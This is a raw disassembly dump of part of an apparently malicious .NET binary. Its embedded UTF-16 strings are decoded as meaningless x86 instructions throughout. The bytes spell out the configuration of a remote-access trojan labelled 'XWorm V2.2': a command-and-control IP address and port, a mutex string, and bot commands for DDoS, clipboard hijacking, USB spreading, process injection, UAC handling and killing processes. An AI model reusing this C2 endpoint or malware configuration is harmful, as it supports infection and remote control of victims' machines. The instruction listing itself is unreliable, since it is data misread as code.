  409c9d:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  409ca4:	5f 
  409ca5:	50                   	push   %eax
  409ca6:	61                   	popa
  409ca7:	72 61                	jb     0x409d0a
  409ca9:	6d                   	insl   (%dx),%es:(%edi)
  409caa:	00 47 65             	add    %al,0x65(%edi)
  409cad:	74 49                	je     0x409cf8
  409caf:	6d                   	insl   (%dx),%es:(%edi)
  409cb0:	61                   	popa
  409cb1:	67 65 45             	addr16 gs inc %ebp
  409cb4:	6e                   	outsb  %ds:(%esi),(%dx)
  409cb5:	63 6f 64             	arpl   %ebp,0x64(%edi)
  409cb8:	65 72 73             	gs jb  0x409d2e
  409cbb:	00 67 65             	add    %ah,0x65(%edi)
  409cbe:	74 5f                	je     0x409d1f
  409cc0:	4d                   	dec    %ebp
  409cc1:	69 6d 65 54 79 70 65 	imul   $0x65707954,0x65(%ebp),%ebp
  409cc8:	00 43 6f             	add    %al,0x6f(%ebx)
  409ccb:	6d                   	insl   (%dx),%es:(%edi)
  409ccc:	70 69                	jo     0x409d37
  409cce:	6c                   	insb   (%dx),%es:(%edi)
  409ccf:	61                   	popa
  409cd0:	74 69                	je     0x409d3b
  409cd2:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  409cd4:	52                   	push   %edx
  409cd5:	65 6c                	gs insb (%dx),%es:(%edi)
  409cd7:	61                   	popa
  409cd8:	78 61                	js     0x409d3b
  409cda:	74 69                	je     0x409d45
  409cdc:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdd:	6e                   	outsb  %ds:(%esi),(%dx)
  409cde:	73 41                	jae    0x409d21
  409ce0:	74 74                	je     0x409d56
  409ce2:	72 69                	jb     0x409d4d
  409ce4:	62 75 74             	bound  %esi,0x74(%ebp)
  409ce7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409ceb:	6e                   	outsb  %ds:(%esi),(%dx)
  409cec:	74 69                	je     0x409d57
  409cee:	6d                   	insl   (%dx),%es:(%edi)
  409cef:	65 43                	gs inc %ebx
  409cf1:	6f                   	outsl  %ds:(%esi),(%dx)
  409cf2:	6d                   	insl   (%dx),%es:(%edi)
  409cf3:	70 61                	jo     0x409d56
  409cf5:	74 69                	je     0x409d60
  409cf7:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  409cfa:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  409d01:	69 
  409d02:	62 75 74             	bound  %esi,0x74(%ebp)
  409d05:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  409d09:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  409d10:	62 
  409d11:	75 74                	jne    0x409d87
  409d13:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d17:	73 65                	jae    0x409d7e
  409d19:	6d                   	insl   (%dx),%es:(%edi)
  409d1a:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  409d1e:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  409d25:	69 
  409d26:	6f                   	outsl  %ds:(%esi),(%dx)
  409d27:	6e                   	outsb  %ds:(%esi),(%dx)
  409d28:	41                   	inc    %ecx
  409d29:	74 74                	je     0x409d9f
  409d2b:	72 69                	jb     0x409d96
  409d2d:	62 75 74             	bound  %esi,0x74(%ebp)
  409d30:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d34:	73 65                	jae    0x409d9b
  409d36:	6d                   	insl   (%dx),%es:(%edi)
  409d37:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409d3b:	72 61                	jb     0x409d9e
  409d3d:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  409d40:	61                   	popa
  409d41:	72 6b                	jb     0x409dae
  409d43:	41                   	inc    %ecx
  409d44:	74 74                	je     0x409dba
  409d46:	72 69                	jb     0x409db1
  409d48:	62 75 74             	bound  %esi,0x74(%ebp)
  409d4b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d4f:	73 65                	jae    0x409db6
  409d51:	6d                   	insl   (%dx),%es:(%edi)
  409d52:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409d56:	6f                   	outsl  %ds:(%esi),(%dx)
  409d57:	70 79                	jo     0x409dd2
  409d59:	72 69                	jb     0x409dc4
  409d5b:	67 68 74 41 74 74    	addr16 push $0x74744174
  409d61:	72 69                	jb     0x409dcc
  409d63:	62 75 74             	bound  %esi,0x74(%ebp)
  409d66:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d6a:	73 65                	jae    0x409dd1
  409d6c:	6d                   	insl   (%dx),%es:(%edi)
  409d6d:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  409d71:	72 6f                	jb     0x409de2
  409d73:	64 75 63             	fs jne 0x409dd9
  409d76:	74 41                	je     0x409db9
  409d78:	74 74                	je     0x409dee
  409d7a:	72 69                	jb     0x409de5
  409d7c:	62 75 74             	bound  %esi,0x74(%ebp)
  409d7f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d83:	73 65                	jae    0x409dea
  409d85:	6d                   	insl   (%dx),%es:(%edi)
  409d86:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409d8a:	6f                   	outsl  %ds:(%esi),(%dx)
  409d8b:	6d                   	insl   (%dx),%es:(%edi)
  409d8c:	70 61                	jo     0x409def
  409d8e:	6e                   	outsb  %ds:(%esi),(%dx)
  409d8f:	79 41                	jns    0x409dd2
  409d91:	74 74                	je     0x409e07
  409d93:	72 69                	jb     0x409dfe
  409d95:	62 75 74             	bound  %esi,0x74(%ebp)
  409d98:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d9c:	73 65                	jae    0x409e03
  409d9e:	6d                   	insl   (%dx),%es:(%edi)
  409d9f:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  409da3:	65 73 63             	gs jae 0x409e09
  409da6:	72 69                	jb     0x409e11
  409da8:	70 74                	jo     0x409e1e
  409daa:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  409db1:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  409db8:	73 73                	jae    0x409e2d
  409dba:	65 6d                	gs insl (%dx),%es:(%edi)
  409dbc:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409dc0:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  409dc7:	72 
  409dc8:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  409dcf:	6c                   	insb   (%dx),%es:(%edi)
  409dd0:	69 65 6e 74 00 43 6c 	imul   $0x6c430074,0x6e(%ebp),%esp
  409dd7:	69 65 6e 74 2e 65 78 	imul   $0x78652e74,0x6e(%ebp),%esp
  409dde:	65 00 00             	add    %al,%gs:(%eax)
  409de1:	1b 32                	sbb    (%edx),%esi
  409de3:	00 30                	add    %dh,(%eax)
  409de5:	00 2e                	add    %ch,(%esi)
  409de7:	00 32                	add    %dh,(%edx)
  409de9:	00 31                	add    %dh,(%ecx)
  409deb:	00 39                	add    %bh,(%ecx)
  409ded:	00 2e                	add    %ch,(%esi)
  409def:	00 31                	add    %dh,(%ecx)
  409df1:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  409df7:	00 32                	add    %dh,(%edx)
  409df9:	00 34 00             	add    %dh,(%eax,%eax,1)
  409dfc:	00 09                	add    %cl,(%ecx)
  409dfe:	32 00                	xor    (%eax),%al
  409e00:	32 00                	xor    (%eax),%al
  409e02:	33 00                	xor    (%eax),%eax
  409e04:	39 00                	cmp    %eax,(%eax)
  409e06:	00 17                	add    %dl,(%edi)
  409e08:	3c 00                	cmp    $0x0,%al
  409e0a:	31 00                	xor    %eax,(%eax)
  409e0c:	32 00                	xor    (%eax),%al
  409e0e:	33 00                	xor    (%eax),%eax
  409e10:	34 00                	xor    $0x0,%al
  409e12:	35 00 36 00 37       	xor    $0x37003600,%eax
  409e17:	00 38                	add    %bh,(%eax)
  409e19:	00 39                	add    %bh,(%ecx)
  409e1b:	00 3e                	add    %bh,(%esi)
  409e1d:	00 00                	add    %al,(%eax)
  409e1f:	13 3c 00             	adc    (%eax,%eax,1),%edi
  409e22:	58                   	pop    %eax
  409e23:	00 77 00             	add    %dh,0x0(%edi)
  409e26:	6f                   	outsl  %ds:(%esi),(%dx)
  409e27:	00 72 00             	add    %dh,0x0(%edx)
  409e2a:	6d                   	insl   (%dx),%es:(%edi)
  409e2b:	00 6d 00             	add    %ch,0x0(%ebp)
  409e2e:	6d                   	insl   (%dx),%es:(%edi)
  409e2f:	00 3e                	add    %bh,(%esi)
  409e31:	00 00                	add    %al,(%eax)
  409e33:	0f 55 00             	andnps (%eax),%xmm0
  409e36:	53                   	push   %ebx
  409e37:	00 42 00             	add    %al,0x0(%edx)
  409e3a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409e3e:	78 00                	js     0x409e40
  409e40:	65 00 00             	add    %al,%gs:(%eax)
  409e43:	21 69 00             	and    %ebp,0x0(%ecx)
  409e46:	56                   	push   %esi
  409e47:	00 46 00             	add    %al,0x0(%esi)
  409e4a:	51                   	push   %ecx
  409e4b:	00 67 00             	add    %ah,0x0(%edi)
  409e4e:	42                   	inc    %edx
  409e4f:	00 71 00             	add    %dh,0x0(%ecx)
  409e52:	4d                   	dec    %ebp
  409e53:	00 61 00             	add    %ah,0x0(%ecx)
  409e56:	6e                   	outsb  %ds:(%esi),(%dx)
  409e57:	00 6f 00             	add    %ch,0x0(%edi)
  409e5a:	51                   	push   %ecx
  409e5b:	00 55 00             	add    %dl,0x0(%ebp)
  409e5e:	48                   	dec    %eax
  409e5f:	00 48 00             	add    %cl,0x0(%eax)
  409e62:	51                   	push   %ecx
  409e63:	00 00                	add    %al,(%eax)
  409e65:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  409e69:	09 49 00             	or     %ecx,0x0(%ecx)
  409e6c:	4e                   	dec    %esi
  409e6d:	00 46 00             	add    %al,0x0(%esi)
  409e70:	4f                   	dec    %edi
  409e71:	00 00                	add    %al,(%eax)
  409e73:	13 4d 00             	adc    0x0(%ebp),%ecx
  409e76:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409e7c:	6f                   	outsl  %ds:(%esi),(%dx)
  409e7d:	00 73 00             	add    %dh,0x0(%ebx)
  409e80:	6f                   	outsl  %ds:(%esi),(%dx)
  409e81:	00 66 00             	add    %ah,0x0(%esi)
  409e84:	74 00                	je     0x409e86
  409e86:	00 19                	add    %bl,(%ecx)
  409e88:	53                   	push   %ebx
  409e89:	00 65 00             	add    %ah,0x0(%ebp)
  409e8c:	72 00                	jb     0x409e8e
  409e8e:	76 00                	jbe    0x409e90
  409e90:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  409e96:	20 00                	and    %al,(%eax)
  409e98:	50                   	push   %eax
  409e99:	00 61 00             	add    %ah,0x0(%ecx)
  409e9c:	63 00                	arpl   %eax,(%eax)
  409e9e:	6b 00 00             	imul   $0x0,(%eax),%eax
  409ea1:	05 53 00 50 00       	add    $0x500053,%eax
  409ea6:	00 03                	add    %al,(%ebx)
  409ea8:	20 00                	and    %al,(%eax)
  409eaa:	00 0b                	add    %cl,(%ebx)
  409eac:	46                   	inc    %esi
  409ead:	00 61 00             	add    %ah,0x0(%ecx)
  409eb0:	6c                   	insb   (%dx),%es:(%edi)
  409eb1:	00 73 00             	add    %dh,0x0(%ebx)
  409eb4:	65 00 00             	add    %al,%gs:(%eax)
  409eb7:	0b 33                	or     (%ebx),%esi
  409eb9:	00 32                	add    %dh,(%edx)
  409ebb:	00 62 00             	add    %ah,0x0(%edx)
  409ebe:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  409ec4:	54                   	push   %esp
  409ec5:	00 72 00             	add    %dh,0x0(%edx)
  409ec8:	75 00                	jne    0x409eca
  409eca:	65 00 00             	add    %al,%gs:(%eax)
  409ecd:	0b 36                	or     (%esi),%esi
  409ecf:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ed2:	62 00                	bound  %eax,(%eax)
  409ed4:	69 00 74 00 00 15    	imul   $0x15000074,(%eax),%eax
  409eda:	58                   	pop    %eax
  409edb:	00 57 00             	add    %dl,0x0(%edi)
  409ede:	6f                   	outsl  %ds:(%esi),(%dx)
  409edf:	00 72 00             	add    %dh,0x0(%edx)
  409ee2:	6d                   	insl   (%dx),%es:(%edi)
  409ee3:	00 20                	add    %ah,(%eax)
  409ee5:	00 56 00             	add    %dl,0x0(%esi)
  409ee8:	32 00                	xor    (%eax),%al
  409eea:	2e 00 32             	add    %dh,%cs:(%edx)
  409eed:	00 00                	add    %al,(%eax)
  409eef:	03 00                	add    (%eax),%eax
  409ef1:	00 01                	add    %al,(%ecx)
  409ef3:	0b 50 00             	or     0x0(%eax),%edx
  409ef6:	49                   	dec    %ecx
  409ef7:	00 4e 00             	add    %cl,0x0(%esi)
  409efa:	47                   	inc    %edi
  409efb:	00 3f                	add    %bh,(%edi)
  409efd:	00 00                	add    %al,(%eax)
  409eff:	05 52 00 2f 00       	add    $0x2f0052,%eax
  409f04:	00 13                	add    %dl,(%ebx)
  409f06:	0d 00 0a 00 45       	or     $0x45000a00,%eax
  409f0b:	00 72 00             	add    %dh,0x0(%edx)
  409f0e:	72 00                	jb     0x409f10
  409f10:	6f                   	outsl  %ds:(%esi),(%dx)
  409f11:	00 72 00             	add    %dh,0x0(%edx)
  409f14:	3a 00                	cmp    (%eax),%al
  409f16:	20 00                	and    %al,(%eax)
  409f18:	00 05 0d 00 0a 00    	add    %al,0xa000d
  409f1e:	00 07                	add    %al,(%edi)
  409f20:	72 00                	jb     0x409f22
  409f22:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409f26:	00 0b                	add    %cl,(%ebx)
  409f28:	43                   	inc    %ebx
  409f29:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  409f2d:	00 53 00             	add    %dl,0x0(%ebx)
  409f30:	45                   	inc    %ebp
  409f31:	00 00                	add    %al,(%eax)
  409f33:	13 75 00             	adc    0x0(%ebp),%esi
  409f36:	6e                   	outsb  %ds:(%esi),(%dx)
  409f37:	00 69 00             	add    %ch,0x0(%ecx)
  409f3a:	6e                   	outsb  %ds:(%esi),(%dx)
  409f3b:	00 73 00             	add    %dh,0x0(%ebx)
  409f3e:	74 00                	je     0x409f40
  409f40:	61                   	popa
  409f41:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409f45:	00 00                	add    %al,(%eax)
  409f47:	05 75 00 6e 00       	add    $0x6e0075,%eax
  409f4c:	00 0d 75 00 70 00    	add    %cl,0x700075
  409f52:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409f56:	74 00                	je     0x409f58
  409f58:	65 00 00             	add    %al,%gs:(%eax)
  409f5b:	05 44 00 57 00       	add    $0x570044,%eax
  409f60:	00 07                	add    %al,(%edi)
  409f62:	52                   	push   %edx
  409f63:	00 44 00 2d          	add    %al,0x2d(%eax,%eax,1)
  409f67:	00 01                	add    %al,(%ecx)
  409f69:	0b 57 00             	or     0x0(%edi),%edx
  409f6c:	69 00 64 00 74 00    	imul   $0x740064,(%eax),%eax
  409f72:	68 00 00 0d 48       	push   $0x480d0000
  409f77:	00 65 00             	add    %ah,0x0(%ebp)
  409f7a:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  409f80:	74 00                	je     0x409f82
  409f82:	00 07                	add    %al,(%edi)
  409f84:	52                   	push   %edx
  409f85:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  409f89:	00 00                	add    %al,(%eax)
  409f8b:	07                   	pop    %es
  409f8c:	23 00                	and    (%eax),%eax
  409f8e:	23 00                	and    (%eax),%eax
  409f90:	23 00                	and    (%eax),%eax
  409f92:	00 07                	add    %al,(%edi)
  409f94:	24 00                	and    $0x0,%al
  409f96:	24 00                	and    $0x0,%al
  409f98:	24 00                	and    $0x0,%al
  409f9a:	00 09                	add    %cl,(%ecx)
  409f9c:	5e                   	pop    %esi
  409f9d:	00 5e 00             	add    %bl,0x0(%esi)
  409fa0:	5e                   	pop    %esi
  409fa1:	00 26                	add    %ah,(%esi)
  409fa3:	00 00                	add    %al,(%eax)
  409fa5:	05 46 00 4d 00       	add    $0x4d0046,%eax
  409faa:	00 0d 4d 00 65 00    	add    %cl,0x65004d
  409fb0:	6d                   	insl   (%dx),%es:(%edi)
  409fb1:	00 6f 00             	add    %ch,0x0(%edi)
  409fb4:	72 00                	jb     0x409fb6
  409fb6:	79 00                	jns    0x409fb8
  409fb8:	00 05 4c 00 4e 00    	add    %al,0x4e004c
  409fbe:	00 03                	add    %al,(%ebx)
  409fc0:	2d 00 01 0f 67       	sub    $0x670f0100,%eax
  409fc5:	00 65 00             	add    %ah,0x0(%ebp)
  409fc8:	74 00                	je     0x409fca
  409fca:	69 00 6e 00 66 00    	imul   $0x66006e,(%eax),%eax
  409fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  409fd1:	00 00                	add    %al,(%eax)
  409fd3:	0b 58 00             	or     0x0(%eax),%ebx
  409fd6:	69 00 6e 00 66 00    	imul   $0x66006e,(%eax),%eax
  409fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  409fdd:	00 00                	add    %al,(%eax)
  409fdf:	09 67 00             	or     %esp,0x0(%edi)
  409fe2:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  409fe7:	00 00                	add    %al,(%eax)
  409fe9:	07                   	pop    %es
  409fea:	75 00                	jne    0x409fec
  409fec:	72 00                	jb     0x409fee
  409fee:	6c                   	insb   (%dx),%es:(%edi)
  409fef:	00 00                	add    %al,(%eax)
  409ff1:	11 6f 00             	adc    %ebp,0x0(%edi)
  409ff4:	70 00                	jo     0x409ff6
  409ff6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409ffa:	68 00 69 00 64       	push   $0x64006900
  409fff:	00 65 00             	add    %ah,0x0(%ebp)
  40a002:	00 39                	add    %bh,(%ecx)
  40a004:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  40a00a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a00e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a00f:	00 65 00             	add    %ah,0x0(%ebp)
  40a012:	74 00                	je     0x40a014
  40a014:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40a018:	70 00                	jo     0x40a01a
  40a01a:	6c                   	insb   (%dx),%es:(%edi)
  40a01b:	00 6f 00             	add    %ch,0x0(%edi)
  40a01e:	72 00                	jb     0x40a020
  40a020:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a024:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40a028:	70 00                	jo     0x40a02a
  40a02a:	70 00                	jo     0x40a02c
  40a02c:	6c                   	insb   (%dx),%es:(%edi)
  40a02d:	00 69 00             	add    %ch,0x0(%ecx)
  40a030:	63 00                	arpl   %eax,(%eax)
  40a032:	61                   	popa
  40a033:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a037:	00 6f 00             	add    %ch,0x0(%edi)
  40a03a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a03b:	00 00                	add    %al,(%eax)
  40a03d:	01 00                	add    %eax,(%eax)
  40a03f:	11 6e 00             	adc    %ebp,0x0(%esi)
  40a042:	61                   	popa
  40a043:	00 76 00             	add    %dh,0x0(%esi)
  40a046:	69 00 67 00 61 00    	imul   $0x610067,(%eax),%eax
  40a04c:	74 00                	je     0x40a04e
  40a04e:	65 00 00             	add    %al,%gs:(%eax)
  40a051:	0f 76 00             	pcmpeqd (%eax),%mm0
  40a054:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40a05a:	62 00                	bound  %eax,(%eax)
  40a05c:	6c                   	insb   (%dx),%es:(%edi)
  40a05d:	00 65 00             	add    %ah,0x0(%ebp)
  40a060:	00 11                	add    %dl,(%ecx)
  40a062:	73 00                	jae    0x40a064
  40a064:	68 00 65 00 6c       	push   $0x6c006500
  40a069:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a06d:	00 75 00             	add    %dh,0x0(%ebp)
  40a070:	63 00                	arpl   %eax,(%eax)
  40a072:	00 0d 72 00 65 00    	add    %cl,0x650072
  40a078:	67 00 66 00          	add    %ah,0x0(%bp)
  40a07c:	75 00                	jne    0x40a07e
  40a07e:	63 00                	arpl   %eax,(%eax)
  40a080:	00 1b                	add    %bl,(%ebx)
  40a082:	57                   	push   %edi
  40a083:	00 53 00             	add    %dl,0x0(%ebx)
  40a086:	63 00                	arpl   %eax,(%eax)
  40a088:	72 00                	jb     0x40a08a
  40a08a:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a090:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40a094:	68 00 65 00 6c       	push   $0x6c006500
  40a099:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40a09d:	11 52 00             	adc    %edx,0x0(%edx)
  40a0a0:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a0a4:	57                   	push   %edi
  40a0a5:	00 72 00             	add    %dh,0x0(%edx)
  40a0a8:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40a0ae:	00 13                	add    %dl,(%ebx)
  40a0b0:	52                   	push   %edx
  40a0b1:	00 45 00             	add    %al,0x0(%ebp)
  40a0b4:	47                   	inc    %edi
  40a0b5:	00 5f 00             	add    %bl,0x0(%edi)
  40a0b8:	44                   	inc    %esp
  40a0b9:	00 57 00             	add    %dl,0x0(%edi)
  40a0bc:	4f                   	dec    %edi
  40a0bd:	00 52 00             	add    %dl,0x0(%edx)
  40a0c0:	44                   	inc    %esp
  40a0c1:	00 00                	add    %al,(%eax)
  40a0c3:	07                   	pop    %es
  40a0c4:	62 00                	bound  %eax,(%eax)
  40a0c6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0c7:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40a0cb:	19 52 00             	sbb    %edx,0x0(%edx)
  40a0ce:	75 00                	jne    0x40a0d0
  40a0d0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0d1:	00 42 00             	add    %al,0x0(%edx)
  40a0d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0d5:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a0d9:	00 69 00             	add    %ch,0x0(%ecx)
  40a0dc:	6c                   	insb   (%dx),%es:(%edi)
  40a0dd:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a0e1:	00 72 00             	add    %dh,0x0(%edx)
  40a0e4:	00 0b                	add    %cl,(%ebx)
  40a0e6:	61                   	popa
  40a0e7:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a0eb:	00 69 00             	add    %ch,0x0(%ecx)
  40a0ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0ef:	00 00                	add    %al,(%eax)
  40a0f1:	07                   	pop    %es
  40a0f2:	75 00                	jne    0x40a0f4
  40a0f4:	61                   	popa
  40a0f5:	00 63 00             	add    %ah,0x0(%ebx)
  40a0f8:	00 0d 73 00 63 00    	add    %cl,0x630073
  40a0fe:	72 00                	jb     0x40a100
  40a100:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a106:	00 07                	add    %al,(%edi)
  40a108:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40a10c:	63 00                	arpl   %eax,(%eax)
  40a10e:	00 0b                	add    %cl,(%ebx)
  40a110:	44                   	inc    %esp
  40a111:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a115:	00 73 00             	add    %dh,0x0(%ebx)
  40a118:	53                   	push   %ebx
  40a119:	00 00                	add    %al,(%eax)
  40a11b:	0b 44 00 44          	or     0x44(%eax,%eax,1),%eax
  40a11f:	00 6f 00             	add    %ch,0x0(%edi)
  40a122:	73 00                	jae    0x40a124
  40a124:	54                   	push   %esp
  40a125:	00 00                	add    %al,(%eax)
  40a127:	0f 43 00             	cmovae (%eax),%eax
  40a12a:	69 00 6c 00 70 00    	imul   $0x70006c,(%eax),%eax
  40a130:	70 00                	jo     0x40a132
  40a132:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a136:	00 0f                	add    %cl,(%edi)
  40a138:	43                   	inc    %ebx
  40a139:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a13d:	00 70 00             	add    %dh,0x0(%eax)
  40a140:	70 00                	jo     0x40a142
  40a142:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a146:	00 05 50 00 45 00    	add    %al,0x450050
  40a14c:	00 0d 69 00 6e 00    	add    %cl,0x6e0069
  40a152:	6a 00                	push   $0x0
  40a154:	52                   	push   %edx
  40a155:	00 75 00             	add    %dh,0x0(%ebp)
  40a158:	6e                   	outsb  %ds:(%esi),(%dx)
  40a159:	00 00                	add    %al,(%eax)
  40a15b:	11 73 00             	adc    %esi,0x0(%ebx)
  40a15e:	74 00                	je     0x40a160
  40a160:	61                   	popa
  40a161:	00 72 00             	add    %dh,0x0(%edx)
  40a164:	74 00                	je     0x40a166
  40a166:	75 00                	jne    0x40a168
  40a168:	73 00                	jae    0x40a16a
  40a16a:	62 00                	bound  %eax,(%eax)
  40a16c:	00 0f                	add    %cl,(%edi)
  40a16e:	73 00                	jae    0x40a170
  40a170:	74 00                	je     0x40a172
  40a172:	61                   	popa
  40a173:	00 72 00             	add    %dh,0x0(%edx)
  40a176:	74 00                	je     0x40a178
  40a178:	73 00                	jae    0x40a17a
  40a17a:	70 00                	jo     0x40a17c
  40a17c:	00 07                	add    %al,(%edi)
  40a17e:	76 00                	jbe    0x40a180
  40a180:	62 00                	bound  %eax,(%eax)
  40a182:	62 00                	bound  %eax,(%eax)
  40a184:	00 0b                	add    %cl,(%ebx)
  40a186:	43                   	inc    %ebx
  40a187:	00 61 00             	add    %ah,0x0(%ecx)
  40a18a:	6c                   	insb   (%dx),%es:(%edi)
  40a18b:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40a18f:	00 00                	add    %al,(%eax)
  40a191:	0d 50 00 53 00       	or     $0x530050,%eax
  40a196:	6c                   	insb   (%dx),%es:(%edi)
  40a197:	00 65 00             	add    %ah,0x0(%ebp)
  40a19a:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40a19e:	00 19                	add    %bl,(%ecx)
  40a1a0:	50                   	push   %eax
  40a1a1:	00 72 00             	add    %dh,0x0(%edx)
  40a1a4:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a1a8:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a1ac:	74 00                	je     0x40a1ae
  40a1ae:	53                   	push   %ebx
  40a1af:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a1b3:	00 65 00             	add    %ah,0x0(%ebp)
  40a1b6:	70 00                	jo     0x40a1b8
  40a1b8:	00 07                	add    %al,(%edi)
  40a1ba:	78 00                	js     0x40a1bc
  40a1bc:	78 00                	js     0x40a1be
  40a1be:	78 00                	js     0x40a1c0
  40a1c0:	00 19                	add    %bl,(%ecx)
  40a1c2:	74 00                	je     0x40a1c4
  40a1c4:	61                   	popa
  40a1c5:	00 73 00             	add    %dh,0x0(%ebx)
  40a1c8:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40a1cb:	00 69 00             	add    %ch,0x0(%ecx)
  40a1ce:	6c                   	insb   (%dx),%es:(%edi)
  40a1cf:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40a1d3:	00 65 00             	add    %ah,0x0(%ebp)
  40a1d6:	78 00                	js     0x40a1d8
  40a1d8:	65 00 00             	add    %al,%gs:(%eax)
  40a1db:	0d 20 00 2f 00       	or     $0x2f0020,%eax
  40a1e0:	70 00                	jo     0x40a1e2
  40a1e2:	69 00 64 00 20 00    	imul   $0x200064,(%eax),%eax
  40a1e8:	00 07                	add    %al,(%edi)
  40a1ea:	20 00                	and    %al,(%eax)
  40a1ec:	2f                   	das
  40a1ed:	00 66 00             	add    %ah,0x0(%esi)
  40a1f0:	00 0f                	add    %cl,(%edi)
  40a1f2:	43                   	inc    %ebx
  40a1f3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1f6:	44                   	inc    %esp
  40a1f7:	00 2e                	add    %ch,(%esi)
  40a1f9:	00 45 00             	add    %al,0x0(%ebp)
  40a1fc:	58                   	pop    %eax
  40a1fd:	00 45 00             	add    %al,0x0(%ebp)
  40a200:	00 29                	add    %ch,(%ecx)
  40a202:	50                   	push   %eax
  40a203:	00 72 00             	add    %dh,0x0(%edx)
  40a206:	6f                   	outsl  %ds:(%esi),(%dx)
  40a207:	00 63 00             	add    %ah,0x0(%ebx)
  40a20a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a20e:	73 00                	jae    0x40a210
  40a210:	20 00                	and    %al,(%eax)
  40a212:	53                   	push   %ebx
  40a213:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a217:	00 72 00             	add    %dh,0x0(%edx)
  40a21a:	74 00                	je     0x40a21c
  40a21c:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40a221:	00 61 00             	add    %ah,0x0(%ecx)
  40a224:	74 00                	je     0x40a226
  40a226:	3a 00                	cmp    (%eax),%al
  40a228:	20 00                	and    %al,(%eax)
  40a22a:	00 11                	add    %dl,(%ecx)
  40a22c:	72 00                	jb     0x40a22e
